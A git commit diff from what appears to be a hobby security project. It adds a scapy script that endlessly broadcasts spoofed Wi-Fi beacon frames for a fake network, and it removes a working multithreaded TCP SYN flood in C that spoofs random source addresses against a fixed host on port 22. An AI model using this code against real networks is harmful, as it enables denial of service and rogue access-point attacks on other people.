ac72f445b84347404315703aa51fa17e974231ea
Alex Clevenger <alexbclevenger@gmail.com>
2023-07-11 09:53:31 -0400

    local changes

--- pineapple/main.py
+++ pineapple/main.py
@@ -1,3 +1,5 @@
+#!venv/bin/python3
+
 # MAC header breakdown
 # 1. Frame Control (2 byte)
 # 2. Duration (2 byte)
@@ -19,10 +21,24 @@
 # libpcap equivalent in c
 
 import scapy.all as scapy
+import time
 
 def send_beacon():
-    pass
+    radiotap = scapy.RadioTap()
+    access_mac = scapy.getmacbyip(scapy.get_if_addr(scapy.conf.iface))
+    ssid = 'TEST'
+    dot11 = scapy.Dot11(type = 0, subtype = 8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = access_mac, addr3 = access_mac)
+    dot11Beacon = scapy.Dot11Beacon(cap='ESS')
+    dot112Elt = scapy.Dot11Elt(ID = 'SSID', info = ssid)
+    packet = radiotap / dot11 / dot11Beacon / dot112Elt
+    while(1):
+        try: 
+            scapy.sendp(packet, scapy.conf.iface, loop = 0)
+            time.sleep(0.1)
+        except KeyboardInterrupt:
+            print("Exiting...")
+            exit()
 
 if __name__ == '__main__':
-    pass
+    send_beacon()
 
--- syn_flood/flood.c
+++ syn_flood/flood.c
@@ -1,79 +1,13 @@
-#include "transfer.h"
+#include <stdio.h> 
 
+#include <pcap.h>
+#include <netinet/if_ether.h>
+#include <netinet/ip.h>
 
-void *thread_handler(void *arg){
-    const char *server_ip = "10.42.0.185";
-    uint16_t port = 22;
+typdef struct ether_header ETH_HEADER;
+typedef struct ip IP_HEADER;
 
-    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if(sd == -1){
-        perror("socket error");
-        exit(EXIT_FAILURE);
-    }
-
-    // packets
-    IP_Header_t *iphead = (IP_Header_t *) malloc(sizeof(IP_Header_t));
-    TCP_Header_t *tcphead = (TCP_Header_t *) malloc(sizeof(TCP_Header_t));
-
-    // convert ip from string to binary
-    struct sockaddr_in dest_addr;
-    dest_addr.sin_family = AF_INET;
-    dest_addr.sin_port = htons(port);
-    if(inet_pton(AF_INET, server_ip, &dest_addr.sin_addr) <= 0){
-        perror("inet_pton error");
-        exit(EXIT_FAILURE);
-    }
-    
-    size_t syn_len = sizeof(IP_Header_t) + sizeof(TCP_Header_t);
-
-    fill_SYN(iphead, tcphead, dest_addr.sin_addr.s_addr, dest_addr.sin_port);
-
-    // initialize rng
-    srand(*((uint32_t*) arg));
-
-    while(1){
-        // get random number
-        uint32_t randnum = rand();
-
-        // randomize source address
-        IP_set_src_address(iphead, get_random_src_address(randnum));
-
-        // update checksums
-        IP_update_checksum(iphead);
-        TCP_update_checksum(tcphead, iphead);
-
-        // serialize
-        byte *ip_stream = serialize_ip_header(iphead);
-        byte *tcp_stream = serialize_tcp_header(tcphead);
-        //      combined serialized segments to form serialized packet
-        byte *syn = form_packet(ip_stream, tcp_stream);
-
-        // send packet
-        if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
-            perror("sendto error");
-            exit(EXIT_FAILURE);
-        }else{
-            printf("Sent successfully\n");
-        }
-        sleep(1);
-    }
-
-    close(sd);
-    return NULL;
-}
 
 int main() {
-    pthread_t ptid;
-    srand(time(NULL));
-    uint32_t randnum;
-
-    for(int i = 0; i < IO_LIMIT; i++){
-        randnum = rand();
-        int pt = pthread_create(&ptid, NULL, thread_handler, (void *) &randnum);
-        if(pt != 0){
-            perror("pthread error");
-        }
-    }
-    pthread_exit(NULL);
-    return 0;
+   
 }
